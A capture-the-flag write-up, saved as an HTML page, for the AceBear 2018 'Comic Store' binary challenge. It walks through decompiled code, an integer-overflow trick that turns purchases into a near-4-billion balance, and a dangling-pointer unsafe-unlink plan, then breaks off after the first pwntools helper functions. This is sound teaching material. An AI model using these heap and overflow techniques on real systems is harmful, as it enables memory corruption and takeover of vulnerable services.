@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>AceBear 2018 - Comic Store | kileak</title>
+
+
+
+
+
+<meta name="description" content="AceBear 2018 - Comic Store">
+
+
+<meta name="keywords" content="acebear">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/acebear-comic_store/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">AceBear 2018 - Comic Store</h1>
+      <p class="post-meta">Jan 27, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Comic Store (4 Solves) (991 points)
+<!--break--></p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/comic_store/comic_store">comic_store</a> <a href="https://kileak.github.io/assets/comic_store/libc.6">libc.6</a> <a href="https://kileak.github.io/assets/comic_store/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">**************************Welcome to Comic Sotre**************************
+*                                                                        *
+*************************Challenge Created By CNV*************************
+*   Team: AceBear                                                        *
+*   My blog: https://chung96vn.blogspot.com/                             *
+**************************************************************************
+
+********************Comic Store*****************
+*                                              *
+* 1 - Register                                 *
+* 2 - Show list comic                          *
+* 3 - Add comic to your cart                   *
+* 4 - Customer's management                    *
+* 5 - Order's management                       *
+* 6 - Checkout                                 *
+* 7 - Exit                                     *
+*                                              *
+************************************************
+Your choice: </code></pre></figure>
+
+<p>Comic Store was quite tricky to get started with.</p>
+
+<p>After registration you were given 300 000 dongs, which you can use to buy comics:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">******************************List********************************
+*                          Name *           Price *     Quantity *
+******************************************************************
+*                         Conan *       31000 VND *      1000000 *
+******************************************************************
+*                   Dragon Ball *       30000 VND *      1000000 *
+******************************************************************
+*                      Doraemon *       26000 VND *      1000000 *
+******************************************************************
+*                     One Piece *       23000 VND *      1000000 *
+******************************************************************
+*                      Inuyasha *       22000 VND *      1000000 *
+******************************************************************
+*                        Naruto *       23000 VND *      1000000 *
+******************************************************************
+*                    Death Note *       21000 VND *      1000000 *
+******************************************************************
+*                  Kattobi Itto *       19000 VND *      1000000 *
+******************************************************************
+*              Kyou Kara Ore Wa *       25000 VND *      1000000 *
+******************************************************************
+*                 Ninja Rantaro *       24000 VND *      1000000 *
+******************************End*********************************
+Name of comic: Conan
+Quantity: 1000000
+Not enough money!</code></pre></figure>
+
+<p>Let’s quickly go through the available menu options</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Register</code> : Obviously register a user</li>
+  <li><code class="language-plaintext highlighter-rouge">Show list comic</code> : Show a list of available comics in the shop</li>
+  <li><code class="language-plaintext highlighter-rouge">Add comic to your cart</code> : Put a specific quantity of comics into your cart</li>
+  <li><code class="language-plaintext highlighter-rouge">Customer's management</code> : Show customer info and rename user and give feedback</li>
+  <li><code class="language-plaintext highlighter-rouge">Order's management</code> : Show cart and remove comics from your cart</li>
+  <li><code class="language-plaintext highlighter-rouge">Checkout</code> : Buy the comics in your cart</li>
+  <li><code class="language-plaintext highlighter-rouge">Exit</code> : Calling exit(0)</li>
+</ul>
+
+<p>Going through the complete reversing of the binary would take up too much place, but let’s take a look at the important stuff at least.</p>
+
+<p>Pseudo code for the used structures in the binary</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">ShopInfo</span> <span class="p">{</span>
+  <span class="n">UserInfo</span><span class="o">*</span> <span class="n">User</span><span class="p">;</span>         <span class="c1">// Current registered user</span>
+  <span class="n">CartList</span><span class="o">*</span> <span class="n">Cart</span><span class="p">;</span>         <span class="c1">// List of comics in your cart</span>
+  <span class="n">Feedback</span><span class="o">*</span> <span class="n">Feedback</span><span class="p">;</span>     <span class="c1">// List of given feedback</span>
+  <span class="n">CartCount</span><span class="o">*</span> <span class="n">CartCount</span><span class="p">;</span>   <span class="c1">// List of comic quantity in your cart</span>
+  <span class="kt">int</span> <span class="n">TotalMoney</span><span class="p">;</span>         <span class="c1">// Current total of the items in the cart</span>
+  <span class="kt">long</span> <span class="n">CartSize</span><span class="p">;</span>          <span class="c1">// Count of entries in the cart</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">UserInfo</span> <span class="p">{</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">sUsername</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">Money</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">Unknown</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">CartList</span> <span class="p">{</span>
+  <span class="n">ComicEntry</span><span class="o">*</span> <span class="n">Items</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>   <span class="c1">// Array of pointers to comic list enries</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">CartCount</span> <span class="p">{</span>
+  <span class="kt">long</span> <span class="n">Quantity</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>       <span class="c1">// Array of quantities put into the cart</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">Feedback</span> <span class="p">{</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">Entry</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>          <span class="c1">// Array of feedback strings</span>
+  <span class="kt">int</span> <span class="n">Count</span><span class="p">;</span>              <span class="c1">// Count of given feedbacks</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">ComicEntry</span> <span class="p">{</span>
+  <span class="n">Comic</span><span class="o">*</span> <span class="n">PtrComic</span><span class="p">;</span>        <span class="c1">// Pointer to the corresponding comic</span>
+  <span class="n">ComicEntry</span><span class="o">*</span> <span class="n">Prev</span><span class="p">;</span>       <span class="c1">// BK</span>
+  <span class="n">ComicEntry</span><span class="o">*</span> <span class="n">Next</span><span class="p">;</span>       <span class="c1">// FD</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">Comic</span> <span class="p">{</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">Name</span><span class="p">;</span>             <span class="c1">// Name of the comic</span>
+  <span class="kt">int</span> <span class="n">Price</span><span class="p">;</span>              <span class="c1">// Price of one comic</span>
+  <span class="kt">int</span> <span class="n">Quantity</span><span class="p">;</span>           <span class="c1">// Amount of available comics in the shop</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The available comics are stored in a linked list with a pointer <code class="language-plaintext highlighter-rouge">COMIC_LIST</code> pointing to the head of the comic list.</p>
+
+<p>We can put up to 6 different comics into our cart, which will effectively put a pointer to the entry in the linked list of the corresponding comic into our cart.</p>
+
+<p>The comic list and the user object will be allocated and initialized on startup, so we have no control over this.</p>
+
+<p>Checking for calls to <code class="language-plaintext highlighter-rouge">free</code> show, that objects will only be freed on <code class="language-plaintext highlighter-rouge">checkout</code> and on <code class="language-plaintext highlighter-rouge">rename customer</code> (though renaming the customer is only allowed once), so let’s take a deeper look at those functions.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">rename_customer</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">272</span><span class="p">];</span>
+  
+  <span class="n">free</span><span class="p">(</span><span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">User</span><span class="o">-&gt;</span><span class="n">Username</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Customer's name: "</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">272uLL</span><span class="p">);</span>
+  <span class="n">read_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">256u</span><span class="p">);</span>
+  
+  <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">User</span><span class="o">-&gt;</span><span class="n">Username</span> <span class="o">=</span> <span class="n">cust_strdup</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+  
+  <span class="n">HAS_RENAMED</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  
+<span class="p">}</span>
+
+<span class="kt">char</span><span class="o">*</span> <span class="nf">cust_strdup</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">len_name</span><span class="p">;</span> 
+  <span class="kt">char</span><span class="o">*</span> <span class="n">dest</span><span class="p">;</span> 
+
+  <span class="n">len_name</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+  <span class="n">dest</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len_name</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">dest</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">();</span>
+
+  <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">len_name</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">dest</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So renaming the user would end up in doing some kind of <code class="language-plaintext highlighter-rouge">realloc</code> if the new length of the string differs from the initial size. Since <code class="language-plaintext highlighter-rouge">malloc</code> is used the allocated chunk won’t be zero’d and we could use this for leaking, if we’d have a freed chunk containing a FD/BK pointer to the heap or libc (main arena). Which we currently don’t have, but let’s keep this in mind.</p>
+
+<p>The real important thing in the comic store is the <code class="language-plaintext highlighter-rouge">checkout</code> function, which shall lead us to victory later on:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="nf">checkout</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="c1">// [SNIP]... Just printing out the current cart ...</span>
+
+  <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">User</span><span class="o">-&gt;</span><span class="n">Money</span> <span class="o">-=</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">TotalMoney</span><span class="p">;</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">5</span> <span class="o">&amp;&amp;</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PtrComic</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="c1">// Unlink and free comics that are sold out</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PtrComic</span><span class="o">-&gt;</span><span class="n">Quantity</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="c1">// This looks pretty much like "unsafe unlink"</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">COMIC_LIST</span> <span class="p">)</span>
+        <span class="n">COMIC_LIST</span> <span class="o">=</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Prev</span> <span class="p">)</span>
+        <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Prev</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="o">=</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="p">)</span>
+        <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Next</span><span class="o">-&gt;</span><span class="n">Prev</span> <span class="o">=</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Prev</span><span class="p">;</span>
+
+      <span class="n">free</span><span class="p">(</span><span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PtrComic</span><span class="p">);</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="o">-&gt;</span><span class="n">Items</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Free the cart and recreate it</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span><span class="p">);</span>
+  <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">CartSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Do you want to buy more?(1:yes or 0:no) "</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">read_number</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Thank you!</span><span class="se">\n</span><span class="s"> See you again!"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">TotalMoney</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
+  <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">Cart</span> <span class="o">=</span> <span class="p">(</span><span class="n">CartList</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">CartCount</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Multiple important things happen here, which should be noted.</p>
+
+<p><em>Unlinking comics, that are sold out</em></p>
+
+<p>When we buyout all available comics, so their quantity falls to 0, the <code class="language-plaintext highlighter-rouge">checkout</code> method will unlink the <code class="language-plaintext highlighter-rouge">ComicEntry</code> for this comic from the available comic list and <code class="language-plaintext highlighter-rouge">free</code> the <code class="language-plaintext highlighter-rouge">Comic</code> object and the <code class="language-plaintext highlighter-rouge">ComicEntry</code> pointer for it. This will create two freed chunks on the heap (which we can use for leaking and some other mean stuff).</p>
+
+<p><em>Free and recreate the cart</em></p>
+
+<p>This is not so obvious from a quick glance at the code, but the recreation of the cart is faulty.</p>
+
+<ul>
+  <li>It will free the cart object (creating a freed chunk in the fastbin list)</li>
+  <li>Sets the pointer for the cart to 0 (so everythings fine?)</li>
+  <li>Directly allocating the cart object again (which will serve us the just freed chunk without initializing it)</li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">free</code> on the cart object will zero out the first <code class="language-plaintext highlighter-rouge">qword</code> of the cart chunk. The following <code class="language-plaintext highlighter-rouge">malloc</code> will just serve us the same chunk we just freed, without initializing it.
+Now checking the order list will show us an empty cart, so it seems everythings fine. But this only happens because the first entry of the cart got cleared by <code class="language-plaintext highlighter-rouge">free</code>, the following comic entries are still there (they just won’t be shown since it breaks on the first empty entry)!</p>
+
+<p>So, if you buy two different comics, this will create two entries in the cart item list. Checking out will effectively only remove the first entry, letting the rest of the cart intact. If we now buy only one (other) comic it will set the first entry, fixing up the cart list. After this all the previous comics will again be available in the cart.</p>
+
+<p>This is important to understand for the exploitation of this binary:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Buying two comics...
+
+CartList:
+  - ComicEntry =&gt; Comic 1
+  - ComicEntry =&gt; Comic 2
+
+Checkout...
+
+CartList:
+  - NULL
+  - ComicEntry =&gt; Comic 2
+
+Buying one comic (other than comic 2)...
+
+CartList:
+  - ComicEntry =&gt; Comic 3
+  - ComicEntry =&gt; Comic 2</code></pre></figure>
+
+<p>Having the <code class="language-plaintext highlighter-rouge">ComicEntry</code> for Comic 2 showing up again alone, won’t help us much, but combining this with the first observation can be used to create a dangling pointer allowing us to exploit it in a kind of use-after-free.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Buy two comics...
+
+CartList:
+  - ComicEntry =&gt; Comic 1 (Quantity 1)
+  - ComicEntry =&gt; Comic 2 (Quantity 1000000)
+
+Checkout...
+
+Since this checkout will buy all available comics of Comic 2, the corresponding ComicEntry and Comic object will be freed
+
+CartList:
+  - NULL
+  - ComicEntry =&gt; NULL (The comic entry was freed, but is still linked in our cart list array)</code></pre></figure>
+
+<p>If we’d now be able to overwrite the dangling ComicEntry with something useful, we could use the <code class="language-plaintext highlighter-rouge">unsafe unlinking</code> in <code class="language-plaintext highlighter-rouge">checkout</code> to overwrite an arbitrary address.</p>
+
+<p>But well, we’re still at square one, because with 300 000 dongs, we won’t be able to buy 1 000 000 comics to start with. So, let’s keep this in mind also and think about a way to “earn” money, instead of spending it :)</p>
+
+<p>For this, we’ll check the process of buying comics in <code class="language-plaintext highlighter-rouge">add_comic_to_cart</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">add_comic_to_cart</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kr">__int32</span> <span class="n">quantity</span><span class="p">;</span> 
+  <span class="kr">__int32</span> <span class="n">total_price</span><span class="p">;</span>
+  <span class="n">ComicEntry</span> <span class="o">*</span><span class="n">comic</span><span class="p">;</span> 
+  <span class="kt">char</span> <span class="n">comic_name</span><span class="p">;</span> 
+  
+  <span class="n">show_list_comic</span><span class="p">(</span><span class="n">COMIC_LIST</span><span class="p">);</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Name of comic: "</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">comic_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+  <span class="n">read_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">comic_name</span><span class="p">,</span> <span class="mi">48</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Quantity: "</span><span class="p">,</span> <span class="mi">48</span><span class="p">);</span>
+  <span class="n">quantity</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="n">comic</span> <span class="o">=</span> <span class="n">search_comic_by_name</span><span class="p">(</span><span class="n">COMIC_LIST</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">comic_name</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">comic</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">comic</span><span class="o">-&gt;</span><span class="n">PtrComic</span><span class="o">-&gt;</span><span class="n">Quantity</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int32</span><span class="p">)</span><span class="n">quantity</span> <span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Not enough comic!"</span><span class="p">);</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="c1">// Calculate the price of the specified amount of comics</span>
+      <span class="n">total_price</span> <span class="o">=</span> <span class="n">quantity</span> <span class="o">*</span> <span class="n">comic</span><span class="o">-&gt;</span><span class="n">PtrComic</span><span class="o">-&gt;</span><span class="n">Price</span><span class="p">;</span>
+   
+      <span class="c1">// Check if we got enough money to buy this</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">total_price</span> <span class="o">+</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">TotalMoney</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">User</span><span class="o">-&gt;</span><span class="n">Money</span> <span class="p">)</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Not enough money!"</span><span class="p">);</span>
+      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">CartSize</span> <span class="o">==</span> <span class="mi">6</span> <span class="p">)</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Your cart is full!"</span><span class="p">);</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="c1">// Add the specified amount of comics to our cart</span>
+        <span class="n">insert_comic_to_cart</span><span class="p">(</span><span class="n">comic</span><span class="p">,</span> <span class="n">quantity</span><span class="p">);</span>
+        <span class="n">SHOP_INFO</span><span class="o">-&gt;</span><span class="n">TotalMoney</span> <span class="o">+=</span> <span class="n">total_price</span><span class="p">;</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"We don't have %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">comic_name</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This will let us specify a comic and the quantity we want to buy and calculates the amount of money we need for this. If we got enough money, this will happily add the comics to our cart.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Quantity</code> and <code class="language-plaintext highlighter-rouge">Total price</code> are stored as <code class="language-plaintext highlighter-rouge">__int32</code>. Nuff said?</p>
+
+<p>No? Ok, let’s elaborate on this.</p>
+
+<ul>
+  <li>We can specify the quantity of comics as <code class="language-plaintext highlighter-rouge">__int32</code> (4 bytes)</li>
+  <li>The quantity will then be multiplied by the price of one comic (also <code class="language-plaintext highlighter-rouge">__int32</code>)</li>
+  <li>It will then add the current money of the items already in the cart (also <code class="language-plaintext highlighter-rouge">__int32</code>) on top of it and compare it to the money our user owns.</li>
+</ul>
+
+<p>Still not?</p>
+
+<ul>
+  <li>The total price will be converted to <code class="language-plaintext highlighter-rouge">unsigned int</code></li>
+  <li>The maximum value for <code class="language-plaintext highlighter-rouge">unsigned int</code> is <code class="language-plaintext highlighter-rouge">0xffffffff</code> (<code class="language-plaintext highlighter-rouge">4294967295</code>)</li>
+  <li>If this value gets bigger, it will wrap back to <code class="language-plaintext highlighter-rouge">0x0</code> and count upwards again</li>
+</ul>
+
+<p>So, if we buy an amount of comics, so that <code class="language-plaintext highlighter-rouge">quantity * comic-&gt;PtrComic-&gt;Price</code> will get bigger than <code class="language-plaintext highlighter-rouge">4294967295</code> the <code class="language-plaintext highlighter-rouge">total_price</code> will jump back to <code class="language-plaintext highlighter-rouge">0</code> (but the <code class="language-plaintext highlighter-rouge">quantity</code> will not).</p>
+
+<p>We could use this repeatedly to buy out all the comics, but we won’t be able to hit exactly <code class="language-plaintext highlighter-rouge">0</code> with this. Buuut, we can so totally abuse this to make us so rich, we could buy the whole shop.</p>
+
+<p>We just buy <code class="language-plaintext highlighter-rouge">138548</code> <code class="language-plaintext highlighter-rouge">Conan</code> comics, which will only cost us <code class="language-plaintext highlighter-rouge">20704</code> dong thanks to the integer overflow (what a bargain :)).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">138548 * 31000 = 0x1000050E0
+
+too big for unsigned int, so it will only use the lower 4 bytes
+
+=&gt; 0x000050E0 = 20704</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">******************************************************************
+* Total money                   *                      20704 VND *
+******************************************************************
+*                          Name *           Price *     Quantity *
+******************************************************************
+*                         Conan *       31000 VND *       138548 *
+*******************************End********************************</code></pre></figure>
+
+<p>But then again, why should we read so many times the same comic. Hey shop owner, could you take back some of those?</p>
+
+<p>How about refunding me the money for 138538 comics?</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">138538 * 31000 = 0xFFFB95F0
+
+this fits nicely into an unsigned int, so we'll be refunded with
+
+=&gt; 0xFFFB95F0 =&gt; 4294678000 dongs... neat :)
+
+******************************Info********************************
+* Name:        * [SNIP]                                          *
+******************************************************************
+* Money:       *                                      4294957296 *
+******************************************************************</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">add_to_cart</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">quantity</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"comic: "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Quantity: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">quantity</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">remove_comic</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">quantity</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
